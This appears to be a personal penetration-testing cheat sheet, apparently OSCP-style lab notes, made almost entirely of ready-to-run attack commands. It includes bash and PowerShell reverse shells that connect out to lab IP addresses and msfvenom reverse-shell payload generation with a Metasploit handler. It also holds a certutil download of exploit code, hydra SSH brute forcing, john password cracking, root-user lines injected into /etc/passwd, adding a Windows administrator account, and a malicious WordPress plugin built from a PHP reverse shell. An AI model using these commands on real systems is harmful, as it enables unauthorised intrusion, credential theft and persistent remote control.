# TTY Shell

python -c "import pty;pty.spawn('/bin/bash')" 

TTYSHELL when no python: 

export RHOST=10.10.14.38 

bash -c 'bash -i &>/dev/tcp/$RHOST/7070 0<&1' 

bash -c 'bash -i &>/dev/tcp/10.10.14.38/7171 0<&1' 

 
# MSFVENOM MULTIHANDLER

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.44 LPORT=6969 -f raw -o shell.jsp 

Use exploit multi/handler 

Set payload windows/meterpreter/reverse_tcp 

Set LHOST 

Set LPORT 

 
# MSFVENOM PAYLOADS

java/jsp_shell_reverse_tcp 

windows/meterpreter/reverse_tcp 

windows/shell_reverse_tcp 

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.44 LPORT=6969 -f raw -o shell.jsp 

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.44 LPORT=6969 -f asp -o shell.asp 


# Export Path

export PATH=$PATH:/usr/bin

export TERM=xterm


# John

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 

--fork=# 

 
# SSH BRUTE

hydra -l root -P password-file.txt 10.11.1.219 ssh 
  

# SSHUTTLE

sshuttle -vr sean@10.11.1.251 10.1.1.0/24 

 
# Certutil

certutil -URLCache -split -f http://10.10.14.17:8000/40564.c 
 
# XTERM

export TERM=xterm 

 
# Full Interactive Shell for use with VIM/NANO

python -c "import pty;pty.spawn('/bin/bash')" 

Ctrl-z 

Stty raw –echo 

Fg <enter> 


# Escape Lshell

echo && 'bash' 

echo || 'bash' 

https://github.com/ghantoos/lshell/issues/147 


# SSHuttle and SSH TUNNELING

https://www.reddit.com/r/HowToHack/comments/77vu7t/sshuttle_for_pivoting_with_nmap_scans/dow0fz9/ 

 
# Windows Priv Check

https://github.com/pentestmonkey/windows-privesc-check 

https://github.com/GDSSecurity/Windows-Exploit-Suggester 


# Reference Guides

https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP-Survival-Guide#windows-privilege-escalation 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/98124178dbb3006e7f9df09d4b972314cd2ba96b/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md 

https://github.com/DigitalAftermath/EnumerationVisualized/wiki 

https://github.com/gammathc/oscp_material/blob/master/oscp_notes.txt 

 
# Windows Priv Esc

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/98124178dbb3006e7f9df09d4b972314cd2ba96b/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md 

 
# Add root user to etc/passwd

2.6 

mike::0:0:root:/root:/bin/bash 

3.10 

ricky::0:0::/home/ricky:/bin/bash 


# Active Directory

https://adsecurity.org/?p=2362 


# Revert to older git commit 

git checkout f3b46ccb 


# Add new admin on windows

net user /add mike password 

net localgroup administrators mike /add 


# Powershell Commands 

https://techvomit.net/useful-powershell-commands/ 

powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt}" 

powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}" 

Powershell.exe -exec bypass -Command "& {Import-Module .\shell.ps1; Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.38 -Port 7070}" 

 
# Powerup PS1 

https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1 

 
# PAYLOADS ALL THE THINGS

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/98124178dbb3006e7f9df09d4b972314cd2ba96b/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md 


# Wordpress Malicious Plugin

Add header to php-reverse-shell 

/*                                                                                                                             
Plugin Name: Pwn quaoar!                                                                                                       
Plugin URL: www.google.com                                                                                                     
Description: PwnMyPwnFace                                                                                                     
Author: Pete                                                                                                                   
Version: 1.0                                                                                                                  
Author URI: www.google.com                                                                                                     
*/  

Zip mal.zip php-reverse-shell.php 

Add it to the plugins and activate it. 


# HYDRA

hydra -[ l | L ] <login | list> -[ p | P] <password | list> -t <threads> <ip> <format [http-post-form usually]> “<page>:<parameters>:<failed text>” 
